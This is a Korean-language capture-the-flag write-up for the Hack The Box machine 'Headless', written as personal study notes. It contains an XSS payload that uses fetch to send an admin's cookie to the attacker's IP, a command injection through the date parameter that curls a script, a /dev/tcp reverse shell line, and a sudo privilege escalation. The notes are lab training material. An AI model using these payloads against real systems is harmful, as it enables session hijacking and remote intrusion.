htb: headless
### 사용한 취약점: XSS(쿠키 탈취)
- 포트 스캔 결과: 22, 5000(upnp)
- 5000페이지의 웹에 입력값을 넣는 필드가 있고 <>가 있을 경우 error 경고 창이 뜬다.
- gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
- /support 200과 /dashboard 500 결과를 확인하였고 500에는 관리자 쿠키를 탈취하여 접근한다.
  <br></br>
- burpsuite를 사용하여 message=에는 <img src=x onerror=fetch('http://10.10.16.40:8001/?c='+document.cookie);>로 전송
  - 관리자의 쿠키 값이 전송된다
- 먼저 python3 -m http.server 8001로 쿠키값을 전송받을 서버를 설정한다
- user-agent에는 <img src=x onerror=fetch('http://10.10.16.40:8001/'+document.cookie);> 설정
- 파라미터 message에는 <img src=x onerror=fetch('http://10.10.16.40:8001/?c='+document.cookie);> 설정
  - 설정하고 전송할 경우 관리자의 쿠키 값이 전달된다
    - 이를 쿠키 값에 설정하고 /dashboard에 접근한다
<br></br>
- nc -lnvp 4444
- date= 부분에 data=; curl http://10.10.16.40:4444/shell.sh로 리버스 쉘을 획득할 수 있다.
- shell.sh 내용
  - #!/bin/bash sh -i >& /dev/tcp/10.10.16.40/4444 0>&1
<br></br>
- user.txt 플래그 값을 읽고 그 후 sudo -l로 root 비밀번호 없이 실행할 수 있는 /usr/bin/syscheck 존재를 알 수 있다.
- gpt로 분석한 결과 시스템을 체크하는 기능을 갖는다
  - 프로그램 안에서 ./initdb.sh
  - home에서 initdb.sh를 실행한다
  - 그 다음에 /bin/bash -p로 권한상승을 한다
<br></br>
### 알게 된 것
- xss 실행의 다양한 방법
  - https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e
- xss 판단은 <script>alert('xss')</script>로 테스트
  - 소스 보기에서 코드 검사
  - DOM에 동적으로 삽입 되는 경우 찾기
- /bin/bash -p
  - bash shell을 privileged 옵션으로 실행
- sudo -l
  - 현재 사용자가 sudo로 실행할 수 있는 프로그램 나열
  - pw없이 sudo 사용할 수 있는 프로그램도 나열
  - User user1 may run the following commands on hostname: (ALL) ALL
      - user1 is allowed to run any command('ALL') as any user('ALL')
